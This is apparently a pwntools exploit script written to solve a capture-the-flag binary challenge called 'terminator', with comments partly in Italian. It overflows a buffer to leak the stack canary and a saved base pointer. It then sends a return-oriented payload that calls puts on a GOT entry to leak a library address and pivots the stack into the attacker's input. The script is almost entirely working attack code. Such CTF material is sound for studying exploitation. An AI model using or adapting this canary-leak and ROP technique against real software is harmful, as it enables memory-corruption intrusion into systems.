#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=terminator.challs.olicyber.it' '--port=10307' terminator_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('terminator_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'terminator.challs.olicyber.it'
port = int(args.PORT or 10307)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
break *0x004011c7
'''.format(**locals())


# break *0x00401250 after "Where are you from"
# break *0x0040127c before return from welcome

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

io.sendafter(b'> ', b'A'*0x38)

# Ricevo buf
io.recvline()

# Ricevo il canary
canary = b'\x00' + io.recv(7)
info(f"Canary leaked: {hex(int.from_bytes(canary, byteorder='little'))}")

# Ricevo il sbp
main_base_pointer = int.from_bytes(io.recv(6), byteorder = 'little')
info(f"main() base pointer leaked: {hex(main_base_pointer)}")

# Calcolo
welcome_base_pointer = hex(main_base_pointer - 0x20)
# info(f"Welcome() base pointer: {base_pointer}")
our_input_address = main_base_pointer - 0x40

# The following payload let us redirect the execution to b'A'*8,
# payload = flat(
#     b'A'*0x8,
#     b'B'*0x30,
#     canary,
#     p64(our_input_address),
# )

pop_rdi_ret = 0x4012fb
plt_puts = exe.plt.puts
got_puts = exe.got.puts

# Maximum 0x38 bytes of gadget (7 instructions)
payload = flat(
    p64(pop_rdi_ret),
    p64(got_puts),
    p64(plt_puts),
    b'B'*0x20,
    # b'A'*0x38,
    canary,
    p64(our_input_address),
) 

io.sendafter(b'> ', payload)

io.interactive()

